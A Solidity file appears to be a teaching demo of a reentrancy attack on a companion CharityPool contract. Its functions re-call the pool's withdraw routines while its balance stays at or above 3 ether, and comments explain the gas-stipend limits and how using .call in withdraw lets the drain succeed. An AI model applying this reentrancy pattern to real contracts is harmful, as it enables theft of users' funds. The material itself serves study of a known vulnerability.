
pragma solidity ^0.5.0;


import './CharityPool.sol';

contract ReentrancyAttack {

    CharityPool public charityPool;

    constructor(address _charityPool) public {
        charityPool = CharityPool(_charityPool);
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // NOTE: callback function below limited to 2300 gas.  700 to read
    // .. contract balance, 200 for the if statement, and when withdraw
    // .. gets called that's another 9000 for it's transfer function, 
    // .. so no good!  SOLUTION, use .call in withdraw

    // function() external payable { (could've used receive()) upgrade version
        // Fallback limited to 2300 gas.  Costs more gas to load state
        // .. variables which require storage access. SO, we could
        // .. use local variables, which require significantly less gas
        // .. Could do primitives to save even more gas.
        // (initializing a variable or a bigger value increases gas too.)
        
        // uint8 MIN_CHARITY_BALANCE = 3;
        // uint256 WEI_SCALE = 10**18;
        // uint256 total = MIN_CHARITY_BALANCE * WEI_SCALE;
    //     if (address(charityPool).balance >= 3000000000000000000) {
    //         charityPool.withdraw();
    //     }
    // }

    // callback function: Automatically handles
    // .. incoming Ether and updates the contract's balance.
    function fallback1() external payable {
        if (address(charityPool).balance >= 3000000000000000000) {
            charityPool.failedWithdrawAttack();
        }
    }

    function fallback2() external payable {
        if (address(charityPool).balance >= 3000000000000000000) {
            charityPool.successfulWithdrawAttack();
        }
    }

    function initiateAttack() public {
        charityPool.failedWithdrawAttack();
    }

    function initiateAttack2() public {
        charityPool.successfulWithdrawAttack();
    }

}
